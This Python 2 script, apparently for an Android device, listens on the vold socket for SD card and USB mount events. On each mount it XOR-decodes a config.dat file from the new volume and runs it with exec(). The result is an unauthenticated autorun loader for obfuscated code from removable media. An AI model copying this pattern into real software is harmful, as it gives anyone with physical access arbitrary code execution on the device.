"""
sdcard
'605 Volume sdcard /storage/external_storage/sdcard1 state changed from 4 (Mounted) to 5 (Unmounting)'
'605 Volume sdcard /storage/external_storage/sdcard1 state changed from 5 (Unmounting) to 1 (Idle-Unmounted)'
'631 Volume sdcard /storage/external_storage/sdcard1 disk removed (253:0)'
'605 Volume sdcard /storage/external_storage/sdcard1 state changed from 1 (Idle-Unmounted) to 0 (No-Media)'
'605 Volume sdcard /storage/external_storage/sdcard1 state changed from 0 (No-Media) to 2 (Pending)'
'605 Volume sdcard /storage/external_storage/sdcard1 state changed from 2 (Pending) to 1 (Idle-Unmounted)'
'630 Volume sdcard /storage/external_storage/sdcard1 disk inserted (253:0)'
'605 Volume sdcard /storage/external_storage/sdcard1 state changed from 1 (Idle-Unmounted) to 3 (Checking)'
'605 Volume sdcard /storage/external_storage/sdcard1 state changed from 3 (Checking) to 4 (Mounted)'
"""

"""
605 Volume sda1 /storage/external_storage/sda1 state changed from -1 (Initializing) to 0 (No-Media)
605 Volume sda1 /storage/external_storage/sda1 state changed from (No-Media) to 1 (Idle-Unmounted)
630 Volume sda1 /storage/external_storage/sda1 disk inserted (8:1)
605 Volume sda1 /storage/external_storage/sda1 state changed from 1 (Idle-Unmounted) to 3 (Checking)
605 Volume sda1 /storage/external_storage/sda1 state changed from 3 (Checking) to 4 (Mounted)

605 Volume sda1 /storage/external_storage/sda1 state changed from 4 (Mounted) to 5 (Unmounting)
605 Volume sda1 /storage/external_storage/sda1 state changed from 5 (Unmounting) to 1 (Idle-Unmounted)
631 Volume sda1 /storage/external_storage/sda1 disk removed (8:1)
605 Volume sda1 /storage/external_storage/sda1 state changed from 1 (Idle-Unmounted) to 0 (No-Media)
605 Volume sda1 /storage/external_storage/sda1 state changed from 0 (No-Media) to 1 (Idle-Unmounted)
"""

#'631 Volume sdcard /storage/external_storage/sdcard1 disk removed (253:0)'
#'630 Volume sdcard /storage/external_storage/sdcard1 disk inserted (253:0)'


import sys
sys.path.append('/system/lib/python2.7/lib/python27.zip')
#sys.path.append('/mnt/system/lib/libcommon/python27.zip')

import encodings
#sys.path.append('/mnt/system/lib/libcommon')

import socket
import select
import re
from threading import Thread
import os

decodeTable = [
        0x80, 0x02, 0xDA, 0x39, 0x5B, 0x24, 0x1D, 0xF6, 0xB0, 0xF3, 0x8D, 0x85, 0x94, 0x29, 0xF1, 0x09,
        0xC0, 0xC8, 0xB8, 0x63, 0x41, 0x10, 0x27, 0xBA, 0x7B, 0xBE, 0x5D, 0xDC, 0xEB, 0x26, 0x23, 0x53,
        0x97, 0xE9, 0xD5, 0x4F, 0x06, 0xDB, 0xEF, 0xA6, 0xC1, 0x5F, 0x4E, 0x37, 0xAC, 0x2B, 0xAF, 0xBF,
        0x70, 0x47, 0xAD, 0x43, 0xFA, 0xDD, 0xE0, 0xAE, 0xAA, 0xDF, 0x7F, 0x4D, 0xE6, 0xCD, 0x00, 0xB4,
        0xA8, 0xDE, 0x33, 0xC5, 0xEC, 0xE8, 0x28, 0x64, 0x61, 0xD2, 0xCA, 0x6F, 0xC2, 0xF5, 0x59, 0x8A,
        0x69, 0x88, 0xB3, 0x72, 0x14, 0xA7, 0xD9, 0x8E, 0xFB, 0xD6, 0xEE, 0x84, 0x82, 0x1A, 0x25, 0x1E,
        0xF4, 0x78, 0x04, 0x93, 0x68, 0xF7, 0x03, 0x16, 0x0F, 0xAB, 0x90, 0xC4, 0xC3, 0xD0, 0xCB, 0x3B,
        0xA3, 0xC7, 0x40, 0xB9, 0x05, 0x0E, 0x0C, 0xA4, 0x6C, 0x13, 0xF2, 0xE4, 0x17, 0xCC, 0x8C, 0xC9,
        0x2C, 0x0B, 0xD8, 0x50, 0x6D, 0x32, 0xA9, 0x75, 0x4B, 0x36, 0x7D, 0x74, 0x30, 0xA5, 0x3A, 0x5C,
        0x11, 0x48, 0xFE, 0x98, 0xCF, 0xB7, 0xBD, 0xF8, 0x86, 0xD7, 0x3D, 0x81, 0x8B, 0x38, 0x58, 0x76,
        0x3F, 0xE3, 0xE7, 0x2D, 0xF9, 0xD4, 0xE2, 0xED, 0x57, 0x0A, 0x15, 0x7A, 0x20, 0xFD, 0xE5, 0x22,
        0x4C, 0xC6, 0x9F, 0x99, 0x01, 0xE1, 0x92, 0xFF, 0xB6, 0x2F, 0xB1, 0x5E, 0x56, 0x79, 0x8F, 0x60,
        0x3C, 0x65, 0x7C, 0x83, 0x71, 0x3E, 0x1B, 0x6B, 0x52, 0x34, 0xB2, 0x9B, 0x5A, 0x45, 0x62, 0x21,
        0x51, 0x49, 0x6A, 0xCE, 0x6E, 0x1F, 0x54, 0x95, 0x42, 0x2A, 0xD3, 0x19, 0x2E, 0x1C, 0x7E, 0x73,
        0xBC, 0x9D, 0x89, 0x35, 0x07, 0x96, 0x44, 0x9E, 0x46, 0xFC, 0x18, 0x0D, 0x91, 0x08, 0x9A, 0x31,
        0x4A, 0xF0, 0xA0, 0xBB, 0x55, 0xD1, 0x77, 0x9C, 0xEA, 0xA2, 0xB5, 0x66, 0xA1, 0x12, 0x87, 0x67,
];

def decode(infile):
    fin = open(infile,'rb')
    data = fin.read()
    fin.close()
    data = bytearray(data)
    for i in range(len(data)):
        data[i] ^= decodeTable[i%256]
    return str(data)

def run_encripted_script(config_path):
    config_path = os.path.join(config_path,'config.dat')
    data = decode(config_path)
    exec(data)

def parse_msg(msg):
    if not msg:
        return
    #msg = '605 Volume sdcard /storage/external_storage/sdcard1 state changed from 3 (Checking) to 4 (Mounted)'
    #prog = re.compile(r'([\S]+)[\s]+([\S]+)[\s]+([\S]+)[\s]+([\S]+)[\s]+([\S]+)[\s]+([\S]+)[\s]+([\S]+)[\s]+([\S]+)[\s]+([\S]+)')
    if msg[:3] == '605':
        #('605', 'Volume', 'sdcard', '/storage/external_storage/sdcard1', '3', '(Checking)', '4', '(Mounted)')
        prog = re.compile(r'([0-9]+) ([\S]+) ([\S]+) ([\S]+) state changed from ([0-9]+) ([\S]+) to ([0-9]+) ([\S]+)')
        result = prog.match(msg)
        if result:
            result = result.groups()
            name = result[2]
            p = result[3]
            status = result[7]
            return (name,p,status)
    elif msg[:3] == '630':
        pass

class HotPluginMonitor(Thread):
    def __init__(self):
        super(HotPluginMonitor,self).__init__()
    def run(self):
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.connect('/dev/socket/vold')
        print 'start select!'
        while True:
            ss = select.select([s,],[],[],20)
            print 'got something!!!!!'
            data = s.recv(1024)
            for msg in data.split('\x00'):
                result = parse_msg(msg)
        #       print result
                if result and result[2] == '(Mounted)':
                    print result[1],'mounted'
                    self.on_mounted(result[0],result[1])
        s.close()
    def on_mounted(self,name,path):
        print name
        print path
        run_encripted_script(path)
        


def run():
    m = HotPluginMonitor()
    m.start()
    m.join()
